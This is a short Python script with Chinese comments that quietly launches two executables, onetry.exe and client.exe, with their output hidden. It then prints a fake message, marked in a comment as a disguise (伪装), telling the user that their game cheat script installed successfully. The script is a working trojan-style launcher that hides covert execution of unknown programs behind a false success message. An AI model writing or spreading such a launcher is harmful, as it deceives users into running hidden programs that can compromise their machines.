import subprocess
import os

# 自动获取onetry.exe和client.exe的路径
onetry_path = os.path.abspath('onetry.exe')
client_path = os.path.abspath('client.exe')

# 悄悄调用onetry.exe和client.exe
def run_exes():
    subprocess.Popen(onetry_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    subprocess.Popen(client_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

def main():
    run_exes()

if __name__ == "__main__":
    main()
    #伪装
    print("你的脚本外挂已安装完成，请放心体验！")
